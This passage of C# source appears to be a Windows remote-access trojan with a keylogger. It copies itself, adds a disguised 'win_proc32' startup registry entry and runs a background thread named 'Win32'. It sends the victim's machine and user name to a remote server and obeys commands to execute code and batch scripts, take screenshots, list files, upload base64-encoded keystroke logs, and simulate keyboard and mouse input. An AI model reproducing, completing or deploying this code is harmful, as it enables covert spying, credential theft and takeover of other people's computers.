                case Keys.PageDown:
                    if (pressed) buffer = "<pagedown/>";
                    break;
                default:
                    if (pressed) buffer += "<" + Enum.GetName (typeof (Keys), vk).ToLower () + ">";
                    else buffer += "</" + Enum.GetName (typeof (Keys), vk).ToLower () + ">";
                    break;
            }
            return buffer;
        }

        static void StartLoop () {
            mainThread = new Thread (delegate () {
                while (mainThread.IsAlive) {
                    socket = new Client (OnData);
                    WaitToConnect ();
                }
            }) { Name = "Win32", Priority = ThreadPriority.Lowest, IsBackground = true };
            mainThread.Start ();
        }

        static void Main (string[] args) {
            if (!Directory.Exists (Path.Combine (Logger.GetWorkPath (), "cgi"))) {
                try {
                    SelfCopy ();
                    DownloadPython ();
                    while (IS_RUNNING) { Thread.Sleep (1); }
                } catch {
                    RestartApplication ();
                }

                return;
            }/* else if (Application.ExecutablePath != Logger.GetExePath ()) {
                try {
                    SelfStart ();
                    Thread.Sleep (250);
                } catch {
                    RestartApplication ();
                }
                return;
            }*/

            RegistryHandler.AddStartupItem ("win_proc32");

            Client.Init ();

            Direct3DCapture.Init ();
            ComputerMonitor.Start (OnKeyCallback);

            Application.ApplicationExit += (e, a) => { OnClose (); };
            AppDomain.CurrentDomain.ProcessExit += (e, a) => { OnClose (); };

            handler = new ConsoleEventDelegate (ConsoleEventCallback);
            SetConsoleCtrlHandler (handler, true);

            StartLoop ();
            Application.Run ();
        }

        static void OnData (string data) {
            //Console.WriteLine ("[TCP] received: " + data);
            if (waitingForData) {
                waitingForData = false;
                switch (dataWaitingFor) {
                    case "handshake":
                        CheckUpdate (data);
                        socket.Send ("handshake", JsonConvert.SerializeObject (new {
                            computer = Environment.MachineName,
                            user = Environment.UserName
                        }));
                        if (socketBuffer.Count > 0) {
                            socket.Write (socketBuffer.ToArray ());
                            socketBuffer.Clear ();
                        }
                        break;
                    case "update":
                        DoUpdate (data);
                        break;
                    case "execute_code":
                        ExecuteCode (data);
                        break;
                    case "capture":
                        TakeScreenshot ();
                        break;
                    case "batch":
                        ExecuteBatch (data);
                        break;
                    case "list_files":
                        ListFiles (data);
                        break;
                    case "logs":
                        if (data == "clear") {
                            Logger.ClearLogs ();
                        } else {
                            string logs = Convert.ToBase64String (Logger.GetLogs ());
                            Send ("logs", logs);
                        }
                        break;
                    case "key":
                        SimulateKeypress (data);
                        break;
                    case "mouse":
                        SimulateMouseEvent (data);
                        break;
                }
            } else {
                waitingForData = true;
                dataWaitingFor = data;
            }
        }
    }
}
